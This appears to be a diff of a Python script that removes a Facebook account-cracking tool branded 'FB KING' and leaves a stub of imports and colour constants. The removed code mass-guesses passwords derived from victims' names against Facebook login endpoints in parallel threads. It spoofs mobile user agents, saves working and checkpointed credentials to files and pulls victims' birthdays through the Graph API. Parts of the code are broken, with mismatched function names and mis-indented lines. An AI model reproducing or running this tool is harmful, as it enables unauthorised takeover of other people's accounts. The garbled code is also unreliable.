@@ -1,545 +1,241 @@
-try:
-	import requests,calendar
-except ModuleNotFoundError:
-	os.system("python -m pip install requests ")
-try:
-	import bs4
-except ModuleNotFoundError:
-	os.system("python -m pip install bs4 ")
-try:
-	import mechanize
-except ModuleNotFoundError:
-	os.system("python -m pip install mechanize ")
- 
-import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
-from random import randint
-from concurrent.futures import ThreadPoolExecutor
-from bs4 import BeautifulSoup
-from datetime import date
+
+import os,time,random,string,re
+import sys,requests,json,uuid,mechanize
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from datetime import datetime
-from urllib.parse import quote
-import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
-from random import randint
-import requests, re, os, time
-def line_chack_dote():
-	m = [".","..","...","....","....."]
-	for b in range(2):
-		for t in m:
-				sys.stdout.write("\r[*] Creating TNL Internet File " + t)
-	sys.stdout.flush()
-	time.sleep(0.1)
-    
-def readline___Public_Xml():
-	logo()
-	print (' [*]=============================================')
-	print(" \033[1;92m[1] Start Cracking  ")
-	print(" \033[1;94m[2] Create Supper File [ Unlamented ]")
-	print(" \033[1;91m[3] Feedback")
-	print(" [4] YouTube ")
-	print (" [5] Login Other Token")
-	print (" \033[1;93m[0] Exit Programing")
-	print (' [*]=============================================')
-	key = input(" [*] input : ")
-	print (' [*]=============================================')
-	if key in [""]:
-		print (" [!] please select correct option")
-		exit()
-	elif key in ["1", "01"]:
-		time.sleep(0.5)
-		__crack__().plerr()
-	elif key in ["2", "02"]:
-		time.sleep(0.5)
-		os.system('python Dump.py')
-	elif key in ["3", "03"]:
-		time.sleep(0.5)
-		dupcutter()
-	elif key in ["4", "04"]:
-		time.sleep(0.5)
-		sep()
-	elif key in ["5", "05"]:
-		time.sleep(0.5)
-		login()
-	elif key in ["0", "00" , "6"]:
-		time.sleep(0.5)
-		print (" [•] Search : Fb Search / Mahin Ahmed")
-	elif key in ["0", "00"]:
-		exit("\n [✓] Thank you so much♥️\n")
-	else:
-		exit()
- 
-ok = []
-cp = []
-id = []
-user = []
-num = 0
-loop = 0
-IMTIAZ = requests.get
-Prof_Imtiaz = open
-_silet_koceng_  = requests.Session()
-url_mb = "https://mbasic.facebook.com"
-bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
-bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
-ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
-ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
-ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_realme = 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3'
-P = '\x1b[1;97m' # PUTIH
-M = '\033[0;91m' # MERAH 
-H = '\033[1;92m' # HIJAU 
-K = '\033[1;91m' # KUNING 
-B = '\033[0;94m' # BIRU 
-U = '\033[0;95m' # UNGU 
-O = '\033[0;96m' # BIRU MUDA
-N = '\033[0m'	# WARNA MATI 
-def login():
-	os.system("rm -rf access_token.txt");logo()
-	tok = input(' [*] Enter Your Token : ')
-	try:
-			u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
-			u1 = json.loads(u)
-			name = u1['name']
-			ts = open('access_token.txt', 'w')
-			ts.write(tok)
-			ts.close()
-			print("\n\n[*] Login Successful as " + name )
-			time.sleep(1)
-			readline___Public_Xml()
-	except KeyError:
-			print('\n\n[*] Token Expired \033[1;93m Enter fresh Token ')
-			time.sleep(1)
-			login()
- 
-def banner():
-	logo()
-def hasil(ok,cp):
-	if len(ok) != 0 or len(cp) != 0:
-		IMTIAZ_AKING('\n\n\033[0m The Prosess Done...')
-		IMTIAZ_AKING('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
-		#IMTIAZ_AKING('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
-	else:
-		IMTIAZ_AKING('\n\033[0mUps..Tidak Mendapatkan Hasil')
-		exit()
-class __crack__:
-	def __init__(self):
-		self.id = []
-	def plerr(self):
-		try:
-			self.apk = input(" [*] File Name : ")
-			print (' [*]=============================================')
-			self.id = IMTIAZ(self.apk).read().splitlines()
-			IMTIAZ_AKING(' [*] Total ID : %s'%(len(self.id)))
-			print (' [✓] Are You Went To Continue : Type Y')
-		except:
-			IMTIAZ_AKING('\n [!] File Not Found In Storage')
-			input('\n [*] Press Enter To Back');readline___Public_Xml();print("[M] Menual Password ");print('[D] Default Password ')
-     
-		_jokowi_kontol_ = input(" [*] Choose : ")
-		if _jokowi_kontol_ in ('M', 'm'):
-			print('[*] Function Added in new update ')
-		
-			IMTIAZ_AKING('\nEnter Password 123456 or 123456789 For OLd Idz ')
-			while True:
-				pwek = input('\nEnter Password : ')
-				#IMTIAZ_AKING('Sandi > %s'%(pwek))
-				if pwek == '':
-					IMTIAZ_AKING('\nJangan Kosong')
-					time.sleep(1)
-					exit()
-				elif len(pwek)<=5:
-					IMTIAZ_AKING('\nSandi Harus 6 Karakter Lebih Tidak Masalah')
-				else:
-					def _sempak_(bse=None):
-						boy = input('\nPilih : ')
-						if boy == '':
-							IMTIAZ_AKING('\nJangan Kosong')
-							time.sleep(1);self._sempak_()
-						elif boy == "1" or boy == "01":
-							IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
-							IMTIAZ_AKING('[•] Result CP saved to CP.txt')
-							IMTIAZ_AKING('\n\tCrack Processing...\n')
-							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
-							with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
-								for ikeh in self.id:
-									try:
-										kimochi = ikeh.split('|')[0]
-										_ngentot_gratis_.submit(self.__api__, kimochi, bse)
-									except: pass
-									
-							os.remove(self.apk)
-							hasil(ok,cp)
-						elif boy == "2" or boy == "02":
-							IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
-							IMTIAZ_AKING('[•] Result CP saved to CP.txt')
-							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
-							with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
-								for ikeh in self.id:
-									try:
-										kimochi = ikeh.split('|')[0]
-										_ngentot_gratis_.submit(self.__mbasic__, kimochi, bse)
-									except: pass
-							os.remove(self.apk)
-							hasil(ok,cp)
-						elif boy == "3" or boy == "03":
-							IMTIAZ_AKING('\nHasil RESULTS Tersimpan Di > multiresuts.txt')
-							IMTIAZ_AKING('[•] Result CP saved to CP.txt')
-							IMTIAZ_AKING('\n\tCrack Processing...\n\n')
-							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
-							with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
-								for ikeh in self.id:
-									try:
-										kimochi = ikeh.split('|')[0]
-										_ngentot_gratis_.submit(self.__mfb,__, kimochi, bse)
-									except: pass
-									
-							os.remove(self.apk)
-							hasil(ok,cp)
-						else:
-							exit()
-					IMTIAZ_AKING('\n01.) Metode b-api ')
-					IMTIAZ_AKING('02.) Metode mbasic ')
-					IMTIAZ_AKING('03.) Metode Mobile ')
-					_sempak_(pwek.split(','))
-					break
-		elif _jokowi_kontol_ in ('Y', 'y'):
-			print (' [*]=============================================')
-			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
-			print (' [*]=============================================')
-			IMTIAZ_AKING(' [1] FB KING Method 1 ')
-			IMTIAZ_AKING(' [2] FB KING Method 2  [ Pro ]')
-			IMTIAZ_AKING(' [3] FB KING Method 3   ')
-			print (' [*]=============================================')
-			self.__pler__()
-		else:
-			exit()
-		return
-	def __api__(self, user, _sempak_):
-		global ok,cp,loop
-		sys.stdout.write('\r\033[1;97m [MAHIN 😪] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
-		sys.stdout.flush()
-		for pw in _sempak_:
-			pw = pw.lower()
-			try: os.mkdir('')
-			except: pass
-			try:
-				ua_xiaomi = IMTIAZ('agent.txt', 'r').read()
-			except (KeyError, IOError):
-				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-			p = Prof_IMtiaz("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
-			if "access_token" in p:
-				IMTIAZ_AKING('\r\033[1;92m[Successful-FB KING] %s | %s%s      '%(user,pw,tahun(user)))
-				wrt = '%s - %s %s'%(user,pw,tahun(user))
-				ok.append(wrt)
-				open('OK.txt','a').write('%s\n' % wrt)
-				break
-				continue
-			elif "www.facebook.com" in p["error_msg"]:
-				try:
-					token = IMTIAZ('login.txt').read()
-					cp_ttl = Prof_Imtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
-					month, day, year = cp_ttl.split('/')
-					month = bulan_ttl[month]
-					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-FB KING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
-					wrt = '%s - %s - %s %s %s%s'% (user,pw,day,month,year,tahun(user))
-					cp.append(wrt)
-					open('CP.txt','a').write('%s\n' % wrt)
-					break
-				except (KeyError, IOError):
-					month = ''
-					day   = ''
-					year  = ''
-				except:
-					pass
-				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-FB KING] %s | %s%s      '%(user,pw,tahun(user)))
-				wrt = '%s - %s%s' % (user,pw,tahun(user))
-				cp.append(wrt)
-				open('CP.txt','a').write('%s\n' % wrt)
-				break
-				continue
-		loop += 1
-	def __mbasic__(self, user, _sempak_):
-		global ok,cp,loop
-		sys.stdout.write('\r\033[1;97m [FB KING] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
-		sys.stdout.flush()
-		for pw in _sempak_:
-			pw = pw.lower()
-			try: os.mkdir('')
-			except: pass
-			try:
-				ua_xiaomi = IMTIAZ('agent.txt', 'r').read()
-			except (KeyError, IOError):
-				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-			ses = requests.Session()
-			headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
-			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
-			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
-			if 'c_user' in ses.cookies.get_dict():
-				IMTIAZ_AKING('\r\033[1;32m[Successful-FB KING] %s | %s      ' % (user,pw))
-				wrt = '%s - %s' % (user,pw)
-				ok.append(wrt)
-				open('OK.txt','a').write('%s\n' % wrt)
-				break
-				continue
-			elif 'checkpoint' in ses.cookies.get_dict():
-				try:
-					token = IMTIAZ('token.txt').read()
-					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
-					month, day, year = cp_ttl.split('/')
-					month = bulan_ttl[month].IMTIAZ_AKING('\r\033[1;91m[Checkpoint-FB KING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
-					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
-					cp.append(wrt)
-					open('CP.txt','a').write('%s\n' % wrt)
-					break
-				except (KeyError, IOError):
-					month = ''
-					day   = ''
-					year  = ''
-				except:
-					pass
-				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-FB KING] %s | %s%s      ' % (user,pw,tahun(user)))
-				wrt = '%s - %s%s'%(user,pw,tahun(user))
-				cp.append(wrt)
-				open('CP.txt','a').write('%s\n' % wrt)
-				break
-				continue
-		loop += 1
-	def __mfb__(self, user, _sempak_):
-		global ok,cp,loop
-		sys.stdout.write('\r\033[1;97m [FB KING] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
-		sys.stdout.flush()
-		for pw in _sempak_:
-			pw = pw.lower()
-			try: os.mkdir('')
-			except: pass
-			try:
-				ua_xiaomi = IMTIAZ('agent.txt', 'r').read()
-			except (KeyError, IOError):
-				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-			ses = requests.Session()
-			headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua_xiaomi,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
-			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
-			_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
-			if 'c_user' in ses.cookies.get_dict():
-				IMTIAZ_AKING('\r\033[1;92m[Successful-FB KING] %s | %s      '%(user,pw))
-				wrt = '%s - %s - %s' % (user,pw)
-				ok.append(wrt)
-				open('OK.txt','a').write('%s\n' % wrt)
-				break
-				continue
-			elif 'checkpoint' in ses.cookies.get_dict():
-				try:
-					token = IMTIAZ('token.txt').read()
-					cp_ttl = Prof_Aking('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
-					month, day, year = cp_ttl.split('/')
-					month = bulan_ttl[month]
-					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-FB KING] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
-					wrt = '%s - %s - %s %s %s'%(user,pw,day,month,year)
-					cp.append(wrt)
-					open('CP.txt','a').write('%s\n' % wrt)
-					break
-				except (KeyError, IOError):
-					month = ''
-					day   = ''
-					year  = ''
-				except:
-					pass
-				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-FB KING] %s | %s%s      ' % (user,pw,tahun(user)))
-				wrt = '%s - %s%s'%(user,pw,tahun(user))
-				cp.append(wrt)
-				open('CP.txt','a').write('%s\n' % wrt)
-				break
-				continue
-		loop += 1
-	def __pler__(self):
-		yan = input('\n[•] Choose : ')
-		if yan == '':
-			IMTIAZ_AKING('\Choose Error ')
-			exit()
-		elif yan in ('1', '01'):
-			IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
-			IMTIAZ_AKING('[•] Result CP saved to CP.txt')
-			IMTIAZ_AKING('\n\tCrack Processing...\n')
-			IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
-			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
-				for yntkts in self.id:
-					try:
-						uid, name = yntkts.split('|')
-						xz = name.split(' ')
-						if len(xz) == 1:
-							pwx = [name, xz[0]+"123", xz[0]+"12345"]
-						elif len(xz) == 2:
-							pwx = [name, xz[0]+"123", xz[0]+"12345"]
-						elif len(xz) == 3:
-							pwx = [name, xz[0]+"123", xz[0]+"12345"]
-						elif len(xz) == 4:
-							pwx = [name, xz[0]+"123", xz[0]+"12345"]
-						else:
-							pwx = [name, xz[0]+"123", xz[0]+"12345"]
-						_ngentot_gratis_.submit(self.__api__, uid, pwx)
-					except:
-						pass
-			os.remove(self.apk)
-			hasil(ok,cp)
-		elif yan in ('2', '02'):
-			IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
-			IMTIAZ_AKING('[•] Result CP saved to CP.txt')
-			IMTIAZ_AKING('\n\tCrack Processing...\n')
-			IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
-			with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
-for yntkts in self.id:
-					try:
-						uid, name = yntkts.split('|')
-						xz = name.split(' ')
-						if len(xz) == 1:
-							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
-						elif len(xz) == 2:
-							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
-						elif len(xz) == 3:
-							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
-						elif len(xz) == 4:
-							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
-						else:
-							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
-						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
-					except:
-						pass
-			os.remove(self.apk)
-			hasil(ok,cp)
-		elif yan in ('3', '03'):
-			
-			IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
-			with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
-				for yntkts in self.id:
-					try:
-						uid, name = yntkts.split('|')
-						xz = name.split(' ')
-						if len(xz) == 1:
-							pwx = [name, xz[0]+"123", xz[0]+"12345"]
-						elif len(xz) == 2:
-							pwx = [name, xz[0]+"123", xz[0]+"12345"]
-						elif len(xz) == 3:
-							pwx = [name, xz[0]+"123", xz[0]+"12345"]
-						elif len(xz) == 4:
-							pwx = [name, xz[0]+"123", xz[0]+"12345"]
-						else:
-							pwx = [name, xz[0]+"123", xz[0]+"12345"]
-						_ngentot_gratis_.submit(self.__mfb__, uid, pwx)
-					except:
-							pass
-			os.remove(self.apk)
-			hasil(ok,cp)
-		else:
-			IMTIAZ_AKING('\nSalah')
-			time.sleep(1)
-			self.__pler__()
-def tahun(fx):
-	if len(fx)==15:
-		if fx[:10] in ['1000000000']       :tahunz = ' '
-		elif fx[:9] in ['100000000']       :tahunz = '  '
-		elif fx[:8] in ['10000000']        :tahunz = ' '
-		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' '
-		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' '
-		elif fx[:6] in ['100001']          :tahunz = ' '
-		elif fx[:6] in ['100002','100003'] :tahunz = ' '
-		elif fx[:6] in ['100004']          :tahunz = ' '
-		elif fx[:6] in ['100005','100006'] :tahunz = ' '
-		elif fx[:6] in ['100007','100008'] :tahunz = ' '
-		elif fx[:6] in ['100009']          :tahunz = ' '
-		elif fx[:5] in ['10001']           :tahunz = ' '
-		elif fx[:5] in ['10002']           :tahunz = ' '
-		elif fx[:5] in ['10003']           :tahunz = ' '
-		elif fx[:5] in ['10004']           :tahunz = ' '
-		elif fx[:5] in ['10005']           :tahunz = ' '
-		elif fx[:5] in ['10006','10007','10008']:tahunz = ' '
-		else:tahunz=''
-	elif len(fx) in [9,10]:
-		tahunz = ' '
-	elif len(fx)==8:
-		tahunz = ' '
-	elif len(fx)==7:
-		tahunz = ' '
-	else:tahunz=''
-	return tahunz
-if __name__=='__main__':
-	os.system("git pull")
-	
-	help()
-	
-imtiazak_ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-imtiazak_ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
-imtiazak_ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-imtiazak_ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-imtiazak_ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-imtiazak_ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-imtiazak_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
-imtiazak_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-banner="""\033[94m
- 
-O))))))))O)) O))          O))   O))  O))O)))     O))   O))))   
-O))      O)    O))        O))  O))   O))O) O))   O)) O)    O)) 
-O))      O)     O))       O)) O))    O))O)) O))  O))O))        
-\033[1;93mO))))))  O))) O)          O) O)      O))O))  O)) O))O))        
-\033[1;92mO))      O)     O))       O))  O))   O))O))   O) O))O))   O))))
-\033[1;97mO))      O)      O)       O))   O))  O))O))    O) )) O))    O) 
-\033[1;91mO))      O)))) O))        O))     O))O))O))      O))  O)))))
-                                                               
- 
- [*]=============================================
-    Author           :  \033[1;93mBMX MAHIN AHMED
-    \033[1;92mFacebook.        : https://www.facebook.com/FB.King.Mahin
-    \033[1;94mTeam             : Black Mafia 👿👈
-    \033[1;93m❤ U Hetars       : FB KING
- [*]=============================================
-   \033[1;31m  Use (Flight) Airplane Mod For Speed Up \033[1;37m
- [*]============================================="""
-ct = datetime.now()
-n = ct.month
-monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
-try:
-	if n < 0 or n > 12:
-		exit()
-	nTemp = n - 1
-except ValueError:
-	exit()
-urls="https://business.facebook.com/business_locations"
-_ses=requests.Session()
-def logo():
-	time.sleep(0.5)
-	os.system("clear")
-	print(banner)
-	print("")
-	time.sleep(0.5)
- 
-def convert(cok):
-	__for=(
-			'datr='+cok['datr']
-		)+';'+(
-			'c_user='+cok['c_user']
-		)+';'+(
-			'fr='+cok['fr']
-		)+';'+(
-			'xs='+cok['xs'] )
-	return __for
- 
-def dupcutter():
-	os.system("xdg-open https://www.facebook.com/groups/blackmafiax.pamming.squad/?ref=share")
-	time.sleep(3)
-	readline___Public_Xml()
-def sep():
-	logo()
-	os.system("xdg-open https://www.facebook.com/FB.King.Mahin")
-	time.sleep(3)
-	readline___Public_Xml()
-    
-if __name__=='__main__':
-	readline___Public_Xml()
+from string import *
+#------------------[ COLOR ]-----------------#
+B = '\x1b[10;90m';R = '\x1b[10;91m';G = '\x1b[10;92m';H = '\x1b[10;93m';BL = '\x1b[10;94m';BG = '\x1b[10;95m';S = '\x1b[10;96m';W = '\x1b[10;97m';EX = '\x1b[0m';E = '\x1b[m'
+#------------------[ SYTLE ]-----------------#
+dt = '•'
